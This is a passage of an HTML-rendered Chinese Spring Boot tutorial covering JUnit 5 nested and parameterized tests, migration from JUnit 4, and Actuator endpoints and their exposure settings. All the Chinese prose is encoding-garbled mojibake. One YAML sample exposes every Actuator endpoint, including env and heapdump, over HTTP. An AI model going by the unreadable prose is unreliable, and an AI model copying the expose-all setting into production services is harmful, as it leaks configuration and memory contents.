class="hljs-keyword">class</span> <span class="hljs-title class_">AfterPushing</span> &#123;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">anElement</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;an element&quot;</span>;<br><br>            <span class="hljs-meta">@BeforeEach</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">pushAnElement</span><span class="hljs-params">()</span> &#123;<br>                stack.push(anElement);<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;it is no longer empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">isNotEmpty</span><span class="hljs-params">()</span> &#123;<br>                assertFalse(stack.isEmpty());<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;returns the element when popped and is empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnElementWhenPopped</span><span class="hljs-params">()</span> &#123;<br>                assertEquals(anElement, stack.pop());<br>                assertTrue(stack.isEmpty());<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;returns the element when peeked but remains not empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnElementWhenPeeked</span><span class="hljs-params">()</span> &#123;<br>                assertEquals(anElement, stack.peek());<br>                assertFalse(stack.isEmpty());<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="76ã€å•å…ƒæµ‹è¯•-å‚æ•°åŒ–æµ‹è¯•"><a href="#76ã€å•å…ƒæµ‹è¯•-å‚æ•°åŒ–æµ‹è¯•" class="headerlink" title="76ã€å•å…ƒæµ‹è¯•-å‚æ•°åŒ–æµ‹è¯•"></a>76ã€å•å…ƒæµ‹è¯•-å‚æ•°åŒ–æµ‹è¯•</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests">å®˜æ–¹æ–‡æ¡£ - Parameterized Tests</a></p><p>å‚æ•°åŒ–æµ‹è¯•æ˜¯JUnit5å¾ˆé‡è¦çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå®ƒä½¿å¾—ç”¨ä¸åŒçš„å‚æ•°å¤šæ¬¡è¿è¡Œæµ‹è¯•æˆä¸ºäº†å¯èƒ½ï¼Œä¹Ÿä¸ºæˆ‘ä»¬çš„å•å…ƒæµ‹è¯•å¸¦æ¥è®¸å¤šä¾¿åˆ©ã€‚</p><p>åˆ©ç”¨@ValueSourceç­‰æ³¨è§£ï¼ŒæŒ‡å®šå…¥å‚ï¼Œæˆ‘ä»¬å°†å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°è¿›è¡Œå¤šæ¬¡å•å…ƒæµ‹è¯•ï¼Œè€Œä¸éœ€è¦æ¯æ–°å¢ä¸€ä¸ªå‚æ•°å°±æ–°å¢ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œçœå»äº†å¾ˆå¤šå†—ä½™ä»£ç ã€‚</p><p>åˆ©ç”¨**@ValueSource**ç­‰æ³¨è§£ï¼ŒæŒ‡å®šå…¥å‚ï¼Œæˆ‘ä»¬å°†å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°è¿›è¡Œå¤šæ¬¡å•å…ƒæµ‹è¯•ï¼Œè€Œä¸éœ€è¦æ¯æ–°å¢ä¸€ä¸ªå‚æ•°å°±æ–°å¢ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œçœå»äº†å¾ˆå¤šå†—ä½™ä»£ç ã€‚</p><ul><li><strong>@ValueSource</strong>: ä¸ºå‚æ•°åŒ–æµ‹è¯•æŒ‡å®šå…¥å‚æ¥æºï¼Œæ”¯æŒå…«å¤§åŸºç¡€ç±»ä»¥åŠStringç±»å‹,Classç±»å‹</li><li><strong>@NullSource</strong>: è¡¨ç¤ºä¸ºå‚æ•°åŒ–æµ‹è¯•æä¾›ä¸€ä¸ªnullçš„å…¥å‚</li><li><strong>@EnumSource</strong>: è¡¨ç¤ºä¸ºå‚æ•°åŒ–æµ‹è¯•æä¾›ä¸€ä¸ªæšä¸¾å…¥å‚</li><li><strong>@CsvFileSource</strong>ï¼šè¡¨ç¤ºè¯»å–æŒ‡å®šCSVæ–‡ä»¶å†…å®¹ä½œä¸ºå‚æ•°åŒ–æµ‹è¯•å…¥å‚</li><li><strong>@MethodSource</strong>ï¼šè¡¨ç¤ºè¯»å–æŒ‡å®šæ–¹æ³•çš„è¿”å›å€¼ä½œä¸ºå‚æ•°åŒ–æµ‹è¯•å…¥å‚(æ³¨æ„æ–¹æ³•è¿”å›éœ€è¦æ˜¯ä¸€ä¸ªæµ)</li></ul><p>å½“ç„¶å¦‚æœå‚æ•°åŒ–æµ‹è¯•ä»…ä»…åªèƒ½åšåˆ°æŒ‡å®šæ™®é€šçš„å…¥å‚è¿˜è¾¾ä¸åˆ°è®©æˆ‘è§‰å¾—æƒŠè‰³çš„åœ°æ­¥ã€‚è®©æˆ‘çœŸæ­£æ„Ÿåˆ°ä»–çš„å¼ºå¤§ä¹‹å¤„çš„åœ°æ–¹åœ¨äºä»–å¯ä»¥æ”¯æŒå¤–éƒ¨çš„å„ç±»å…¥å‚ã€‚å¦‚:CSV,YML,JSON æ–‡ä»¶ç”šè‡³æ–¹æ³•çš„è¿”å›å€¼ä¹Ÿå¯ä»¥ä½œä¸ºå…¥å‚ã€‚åªéœ€è¦å»å®ç°**<code>ArgumentsProvider</code>**æ¥å£ï¼Œä»»ä½•å¤–éƒ¨æ–‡ä»¶éƒ½å¯ä»¥ä½œä¸ºå®ƒçš„å…¥å‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ParameterizedTest</span><br><span class="hljs-meta">@ValueSource(strings = &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;)</span><br><span class="hljs-meta">@DisplayName(&quot;å‚æ•°åŒ–æµ‹è¯•1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parameterizedTest1</span><span class="hljs-params">(String string)</span> &#123;<br>    System.out.println(string);<br>    Assertions.assertTrue(StringUtils.isNotBlank(string));<br>&#125;<br><br><br><span class="hljs-meta">@ParameterizedTest</span><br><span class="hljs-meta">@MethodSource(&quot;method&quot;)</span>    <span class="hljs-comment">//æŒ‡å®šæ–¹æ³•å</span><br><span class="hljs-meta">@DisplayName(&quot;æ–¹æ³•æ¥æºå‚æ•°&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWithExplicitLocalMethodSource</span><span class="hljs-params">(String name)</span> &#123;<br>    System.out.println(name);<br>    Assertions.assertNotNull(name);<br>&#125;<br><br><span class="hljs-keyword">static</span> Stream&lt;String&gt; <span class="hljs-title function_">method</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Stream.of(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¿ç§»æŒ‡å—"><a href="#è¿ç§»æŒ‡å—" class="headerlink" title="è¿ç§»æŒ‡å—"></a>è¿ç§»æŒ‡å—</h3><p><a href="https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4">å®˜æ–¹æ–‡æ¡£ - Migrating from JUnit 4</a></p><p>åœ¨è¿›è¡Œè¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„å¦‚ä¸‹çš„å˜åŒ–ï¼š</p><ul><li>æ³¨è§£åœ¨ <code>org.junit.jupiter.api</code> åŒ…ä¸­ï¼Œæ–­è¨€åœ¨ <code>org.junit.jupiter.api.Assertions</code> ç±»ä¸­ï¼Œå‰ç½®æ¡ä»¶åœ¨ <code>org.junit.jupiter.api.Assumptions</code> ç±»ä¸­ã€‚</li><li>æŠŠ<code>@Before</code> å’Œ<code>@After</code> æ›¿æ¢æˆ<code>@BeforeEach</code> å’Œ<code>@AfterEach</code>ã€‚</li><li>æŠŠ<code>@BeforeClass</code> å’Œ<code>@AfterClass</code> æ›¿æ¢æˆ<code>@BeforeAll</code> å’Œ@AfterAllã€‚</li><li>æŠŠ<code>@Ignore</code> æ›¿æ¢æˆ<code>@Disabled</code>ã€‚</li><li>æŠŠ<code>@Category</code> æ›¿æ¢æˆ<code>@Tag</code>ã€‚</li><li>æŠŠ<code>@RunWith</code>ã€<code>@Rule</code> å’Œ<code>@ClassRule</code> æ›¿æ¢æˆ<code>@ExtendWith</code>ã€‚</li></ul><h2 id="77ã€æŒ‡æ ‡ç›‘æ§-SpringBoot-Actuatorä¸Endpoint"><a href="#77ã€æŒ‡æ ‡ç›‘æ§-SpringBoot-Actuatorä¸Endpoint" class="headerlink" title="77ã€æŒ‡æ ‡ç›‘æ§-SpringBoot Actuatorä¸Endpoint"></a>77ã€æŒ‡æ ‡ç›‘æ§-SpringBoot Actuatorä¸Endpoint</h2><p>æœªæ¥æ¯ä¸€ä¸ªå¾®æœåŠ¡åœ¨äº‘ä¸Šéƒ¨ç½²ä»¥åï¼Œæˆ‘ä»¬éƒ½éœ€è¦å¯¹å…¶è¿›è¡Œç›‘æ§ã€è¿½è¸ªã€å®¡è®¡ã€æ§åˆ¶ç­‰ã€‚SpringBootå°±æŠ½å–äº†Actuatoråœºæ™¯ï¼Œä½¿å¾—æˆ‘ä»¬æ¯ä¸ªå¾®æœåŠ¡å¿«é€Ÿå¼•ç”¨å³å¯è·å¾—ç”Ÿäº§çº§åˆ«çš„åº”ç”¨ç›‘æ§ã€å®¡è®¡ç­‰åŠŸèƒ½ã€‚</p><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready">å®˜æ–¹æ–‡æ¡£ - Spring Boot Actuator: Production-ready Features</a></p><p><strong>1.xä¸2.xçš„ä¸åŒ</strong>ï¼š</p><ul><li><p>SpringBoot Actuator 1.x</p><ul><li>æ”¯æŒSpringMVC</li><li>åŸºäºç»§æ‰¿æ–¹å¼è¿›è¡Œæ‰©å±•</li><li>å±‚çº§Metricsé…ç½®</li><li>è‡ªå®šä¹‰Metricsæ”¶é›†</li><li>é»˜è®¤è¾ƒå°‘çš„å®‰å…¨ç­–ç•¥</li></ul></li><li><p>SpringBoot Actuator 2.x</p><ul><li>æ”¯æŒSpringMVCã€JAX-RSä»¥åŠWebflux</li><li>æ³¨è§£é©±åŠ¨è¿›è¡Œæ‰©å±•</li><li>å±‚çº§&amp;åç§°ç©ºé—´Metrics</li><li>åº•å±‚ä½¿ç”¨MicroMeterï¼Œå¼ºå¤§ã€ä¾¿æ·é»˜è®¤ä¸°å¯Œçš„å®‰å…¨ç­–ç•¥</li></ul></li></ul><h3 id="å¦‚ä½•ä½¿ç”¨"><a href="#å¦‚ä½•ä½¿ç”¨" class="headerlink" title="å¦‚ä½•ä½¿ç”¨"></a>å¦‚ä½•ä½¿ç”¨</h3><ul><li>æ·»åŠ ä¾èµ–ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>è®¿é—®<code>http://localhost:8080/actuator/**</code>ã€‚</li><li>æš´éœ²æ‰€æœ‰ç›‘æ§ä¿¡æ¯ä¸ºHTTPã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">enabled-by-default:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#æš´éœ²æ‰€æœ‰ç«¯ç‚¹ä¿¡æ¯</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">&#x27;*&#x27;</span>  <span class="hljs-comment">#ä»¥webæ–¹å¼æš´éœ²</span><br></code></pre></td></tr></table></figure><ul><li>æµ‹è¯•ä¾‹å­<ul><li><a href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a></li><li><a href="http://localhost:8080/actuator/configprops">http://localhost:8080/actuator/configprops</a></li><li><a href="http://localhost:8080/actuator/metrics">http://localhost:8080/actuator/metrics</a></li><li><a href="http://localhost:8080/actuator/metrics/jvm.gc.pause">http://localhost:8080/actuator/metrics/jvm.gc.pause</a></li><li><a href="http://localhost:8080/actuator/metrics/endpointName/detailPath">http://localhost:8080/actuator/metrics/endpointName/detailPath</a></li></ul></li></ul><blockquote><p>actuator</p><p>è‹± [ËˆÃ¦ktjÊŠeÉªtÉ™]   ç¾ [ËˆÃ¦ktjuËŒeÉªtÉ™r]</p><p>n. è‡´åŠ¨ï¼ˆä¿ƒåŠ¨ï¼Œæ¿€åŠ±ï¼Œè°ƒèŠ‚ï¼‰å™¨ï¼›ä¼ åŠ¨ï¼ˆè£…ç½®ï¼Œæœºæ„ï¼‰ï¼›æ‹–åŠ¨è£…ç½®ï¼›é©¬è¾¾ï¼›æ“ä½œæœºæ„ï¼›æ‰§è¡Œæœºæ„ï¼ˆå…ƒä»¶ï¼‰ï¼›ï¼ˆç”µç£é“ï¼‰èºçº¿ç®¡ï¼›æ“çºµè£…ç½®ï¼ˆé˜€é—¨ï¼‰ï¼›è°ƒé€Ÿæ§åˆ¶å™¨ï¼›å¾€å¤è¿åŠ¨æ²¹ï¼ˆæ°”ï¼‰ç¼¸ï¼›ä½œåŠ¨ç­’</p></blockquote><blockquote><p>metric</p><p>è‹± [ËˆmetrÉªk]   ç¾ [ËˆmetrÉªk]</p><p>adj. ç±³åˆ¶çš„;å…¬åˆ¶çš„;æŒ‰å…¬åˆ¶åˆ¶ä½œçš„;ç”¨å…¬åˆ¶æµ‹é‡çš„</p><p>n. åº¦é‡æ ‡å‡†;[æ•°å­¦]åº¦é‡;è¯—ä½“;éŸµæ–‡;è¯—éŸµ</p></blockquote><h2 id="78ã€æŒ‡æ ‡ç›‘æ§-å¸¸ä½¿ç”¨çš„ç«¯ç‚¹åŠå¼€å¯ä¸ç¦ç”¨"><a href="#78ã€æŒ‡æ ‡ç›‘æ§-å¸¸ä½¿ç”¨çš„ç«¯ç‚¹åŠå¼€å¯ä¸ç¦ç”¨" class="headerlink" title="78ã€æŒ‡æ ‡ç›‘æ§-å¸¸ä½¿ç”¨çš„ç«¯ç‚¹åŠå¼€å¯ä¸ç¦ç”¨"></a>78ã€æŒ‡æ ‡ç›‘æ§-å¸¸ä½¿ç”¨çš„ç«¯ç‚¹åŠå¼€å¯ä¸ç¦ç”¨</h2><h3 id="å¸¸ä½¿ç”¨çš„ç«¯ç‚¹"><a href="#å¸¸ä½¿ç”¨çš„ç«¯ç‚¹" class="headerlink" title="å¸¸ä½¿ç”¨çš„ç«¯ç‚¹"></a>å¸¸ä½¿ç”¨çš„ç«¯ç‚¹</h3><table><thead><tr><th>ID</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>auditevents</code></td><td>æš´éœ²å½“å‰åº”ç”¨ç¨‹åºçš„å®¡æ ¸äº‹ä»¶ä¿¡æ¯ã€‚éœ€è¦ä¸€ä¸ª<code>AuditEventRepositoryç»„ä»¶</code>ã€‚</td></tr><tr><td><code>beans</code></td><td>æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¸­æ‰€æœ‰Spring Beançš„å®Œæ•´åˆ—è¡¨ã€‚</td></tr><tr><td><code>caches</code></td><td>æš´éœ²å¯ç”¨çš„ç¼“å­˜ã€‚</td></tr><tr><td><code>conditions</code></td><td>æ˜¾ç¤ºè‡ªåŠ¨é…ç½®çš„æ‰€æœ‰æ¡ä»¶ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŒ¹é…æˆ–ä¸åŒ¹é…çš„åŸå› ã€‚</td></tr><tr><td><code>configprops</code></td><td>æ˜¾ç¤ºæ‰€æœ‰<code>@ConfigurationProperties</code>ã€‚</td></tr><tr><td><code>env</code></td><td>æš´éœ²Springçš„å±æ€§<code>ConfigurableEnvironment</code></td></tr><tr><td><code>flyway</code></td><td>æ˜¾ç¤ºå·²åº”ç”¨çš„æ‰€æœ‰Flywayæ•°æ®åº“è¿ç§»ã€‚ éœ€è¦ä¸€ä¸ªæˆ–å¤šä¸ª<code>Flyway</code>ç»„ä»¶ã€‚</td></tr><tr><td><code>health</code></td><td>æ˜¾ç¤ºåº”ç”¨ç¨‹åºè¿è¡ŒçŠ¶å†µä¿¡æ¯ã€‚</td></tr><tr><td><code>httptrace</code></td><td>æ˜¾ç¤ºHTTPè·Ÿè¸ªä¿¡æ¯ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œæœ€è¿‘100ä¸ªHTTPè¯·æ±‚-å“åº”ï¼‰ã€‚éœ€è¦ä¸€ä¸ª<code>HttpTraceRepository</code>ç»„ä»¶ã€‚</td></tr><tr><td><code>info</code></td><td>æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¿¡æ¯ã€‚</td></tr><tr><td><code>integrationgraph</code></td><td>æ˜¾ç¤ºSpring <code>integrationgraph</code> ã€‚éœ€è¦ä¾èµ–<code>spring-integration-core</code>ã€‚</td></tr><tr><td><code>loggers</code></td><td>æ˜¾ç¤ºå’Œä¿®æ”¹åº”ç”¨ç¨‹åºä¸­æ—¥å¿—çš„é…ç½®ã€‚</td></tr><tr><td><code>liquibase</code></td><td>æ˜¾ç¤ºå·²åº”ç”¨çš„æ‰€æœ‰Liquibaseæ•°æ®åº“è¿ç§»ã€‚éœ€è¦ä¸€ä¸ªæˆ–å¤šä¸ª<code>Liquibase</code>ç»„ä»¶ã€‚</td></tr><tr><td><code>metrics</code></td><td>æ˜¾ç¤ºå½“å‰åº”ç”¨ç¨‹åºçš„â€œæŒ‡æ ‡â€ä¿¡æ¯ã€‚</td></tr><tr><td><code>mappings</code></td><td>æ˜¾ç¤ºæ‰€æœ‰<code>@RequestMapping</code>è·¯å¾„åˆ—è¡¨ã€‚</td></tr><tr><td><code>scheduledtasks</code></td><td>æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¸­çš„è®¡åˆ’ä»»åŠ¡ã€‚</td></tr><tr><td><code>sessions</code></td><td>å…è®¸ä»Spring Sessionæ”¯æŒçš„ä¼šè¯å­˜å‚¨ä¸­æ£€ç´¢å’Œåˆ é™¤ç”¨æˆ·ä¼šè¯ã€‚éœ€è¦ä½¿ç”¨Spring Sessionçš„åŸºäºServletçš„Webåº”ç”¨ç¨‹åºã€‚</td></tr><tr><td><code>shutdown</code></td><td>ä½¿åº”ç”¨ç¨‹åºæ­£å¸¸å…³é—­ã€‚é»˜è®¤ç¦ç”¨ã€‚</td></tr><tr><td><code>startup</code></td><td>æ˜¾ç¤ºç”±<code>ApplicationStartup</code>æ”¶é›†çš„å¯åŠ¨æ­¥éª¤æ•°æ®ã€‚éœ€è¦ä½¿ç”¨<code>SpringApplication</code>è¿›è¡Œé…ç½®<code>BufferingApplicationStartup</code>ã€‚</td></tr><tr><td><code>threaddump</code></td><td>æ‰§è¡Œçº¿ç¨‹è½¬å‚¨ã€‚</td></tr></tbody></table><p>å¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºæ˜¯Webåº”ç”¨ç¨‹åºï¼ˆSpring MVCï¼ŒSpring WebFluxæˆ–Jerseyï¼‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹é™„åŠ ç«¯ç‚¹ï¼š</p><table><thead><tr><th>ID</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>heapdump</code></td><td>è¿”å›<code>hprof</code>å †è½¬å‚¨æ–‡ä»¶ã€‚</td></tr><tr><td><code>jolokia</code></td><td>é€šè¿‡HTTPæš´éœ²JMX beanï¼ˆéœ€è¦å¼•å…¥Jolokiaï¼Œä¸é€‚ç”¨äºWebFluxï¼‰ã€‚éœ€è¦å¼•å…¥ä¾èµ–<code>jolokia-core</code>ã€‚</td></tr><tr><td><code>logfile</code></td><td>è¿”å›æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚æœå·²è®¾ç½®<code>logging.file.name</code>æˆ–<code>logging.file.path</code>å±æ€§ï¼‰ã€‚æ”¯æŒä½¿ç”¨HTTP<code>Range</code>æ ‡å¤´æ¥æ£€ç´¢éƒ¨åˆ†æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ã€‚</td></tr><tr><td><code>prometheus</code></td><td>ä»¥PrometheusæœåŠ¡å™¨å¯ä»¥æŠ“å–çš„æ ¼å¼å…¬å¼€æŒ‡æ ‡ã€‚éœ€è¦ä¾èµ–<code>micrometer-registry-prometheus</code>ã€‚</td></tr></tbody></table><p>å…¶ä¸­æœ€å¸¸ç”¨çš„Endpointï¼š</p><ul><li><strong>Healthï¼šç›‘æ§çŠ¶å†µ</strong></li><li><strong>Metricsï¼šè¿è¡Œæ—¶æŒ‡æ ‡</strong></li><li><strong>Loggersï¼šæ—¥å¿—è®°å½•</strong></li></ul><h3 id="Health-Endpoint"><a href="#Health-Endpoint" class="headerlink" title="Health Endpoint"></a>Health Endpoint</h3><p>å¥åº·æ£€æŸ¥ç«¯ç‚¹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨äºåœ¨äº‘å¹³å°ï¼Œå¹³å°ä¼šå®šæ—¶çš„æ£€æŸ¥åº”ç”¨çš„å¥åº·çŠ¶å†µï¼Œæˆ‘ä»¬å°±éœ€è¦Health Endpointå¯ä»¥ä¸ºå¹³å°è¿”å›å½“å‰åº”ç”¨çš„ä¸€ç³»åˆ—ç»„ä»¶å¥åº·çŠ¶å†µçš„é›†åˆã€‚</p><p>é‡è¦çš„å‡ ç‚¹ï¼š</p><ul><li>health endpointè¿”å›çš„ç»“æœï¼Œåº”è¯¥æ˜¯ä¸€ç³»åˆ—å¥åº·æ£€æŸ¥åçš„ä¸€ä¸ªæ±‡æ€»æŠ¥å‘Šã€‚</li><li>å¾ˆå¤šçš„å¥åº·æ£€æŸ¥é»˜è®¤å·²ç»è‡ªåŠ¨é…ç½®å¥½äº†ï¼Œæ¯”å¦‚ï¼šæ•°æ®åº“ã€redisç­‰ã€‚</li><li>å¯ä»¥å¾ˆå®¹æ˜“çš„æ·»åŠ è‡ªå®šä¹‰çš„å¥åº·æ£€æŸ¥æœºåˆ¶ã€‚</li></ul><h3 id="Metrics-Endpoint"><a href="#Metrics-Endpoint" class="headerlink" title="Metrics Endpoint"></a>Metrics Endpoint</h3><p>æä¾›è¯¦ç»†çš„ã€å±‚çº§çš„ã€ç©ºé—´æŒ‡æ ‡ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥è¢«pullï¼ˆä¸»åŠ¨æ¨é€ï¼‰æˆ–è€…pushï¼ˆè¢«åŠ¨è·å–ï¼‰æ–¹å¼å¾—åˆ°ï¼š</p><ul><li>é€šè¿‡Metricså¯¹æ¥å¤šç§ç›‘æ§ç³»ç»Ÿã€‚</li><li>ç®€åŒ–æ ¸å¿ƒMetricså¼€å‘ã€‚</li><li>æ·»åŠ è‡ªå®šä¹‰Metricsæˆ–è€…æ‰©å±•å·²æœ‰Metricsã€‚</li></ul><h3 id="å¼€å¯ä¸ç¦ç”¨Endpoints"><a href="#å¼€å¯ä¸ç¦ç”¨Endpoints" class="headerlink" title="å¼€å¯ä¸ç¦ç”¨Endpoints"></a>å¼€å¯ä¸ç¦ç”¨Endpoints</h3><ul><li>é»˜è®¤æ‰€æœ‰çš„Endpointé™¤è¿‡shutdownéƒ½æ˜¯å¼€å¯çš„ã€‚</li><li>éœ€è¦å¼€å¯æˆ–è€…ç¦ç”¨æŸä¸ªEndpointã€‚é…ç½®æ¨¡å¼ä¸º<code>management.endpoint.&lt;endpointName&gt;.enabled = true</code></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">beans:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><ul><li>æˆ–è€…ç¦ç”¨æ‰€æœ‰çš„Endpointç„¶åæ‰‹åŠ¨å¼€å¯æŒ‡å®šçš„Endpointã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">enabled-by-default:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">beans:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">health:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="æš´éœ²Endpoints"><a href="#æš´éœ²Endpoints" class="headerlink" title="æš´éœ²Endpoints"></a>æš´éœ²Endpoints</h3><p>æ”¯æŒçš„æš´éœ²æ–¹å¼</p><ul><li>HTTPï¼šé»˜è®¤åªæš´éœ²healthå’Œinfoã€‚</li><li>JMXï¼šé»˜è®¤æš´éœ²æ‰€æœ‰Endpointã€‚</li><li>é™¤è¿‡healthå’Œinfoï¼Œå‰©ä¸‹çš„Endpointéƒ½åº”è¯¥è¿›è¡Œä¿æŠ¤è®¿é—®ã€‚å¦‚æœå¼•å…¥Spring Securityï¼Œåˆ™ä¼šé»˜è®¤é…ç½®å®‰å…¨è®¿é—®è§„åˆ™ã€‚</li></ul><table><thead><tr><th align="left">ID</th><th align="left">JMX</th><th align="left">Web</th></tr></thead><tbody><tr><td align="left"><code>auditevents</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>beans</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>caches</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>conditions</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>configprops</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>env</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>flyway</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>health</code></td><td align="left">Yes</td><td align="left">Yes</td></tr><tr><td align="left"><code>heapdump</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>httptrace</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>info</code></td><td align="left">Yes</td><td align="left">Yes</td></tr><tr><td align="left"><code>integrationgraph</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>jolokia</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>logfile</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>loggers</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>liquibase</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>metrics</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>mappings</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>prometheus</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>scheduledtasks</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>sessions</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>shutdown</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>startup</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>threaddump</code></td><td align="left">Yes</td><td align="left">No</td></tr></tbody></table><p>è‹¥è¦æ›´æ”¹å…¬å¼€çš„Endpointï¼Œè¯·é…ç½®ä»¥ä¸‹çš„åŒ…å«å’Œæ’é™¤å±æ€§ï¼š</p><table><thead><tr><th align="left">Property</th><th align="left">Default</th></tr></thead><tbody><tr><td align="left"><code>management.endpoints.jmx.exposure.exclude</code></td><td align="left"></td></tr><tr><td align="left"><code>management.endpoints.jmx.exposure.include</code></td><td align="left"><code>*</code></td></tr><tr><td 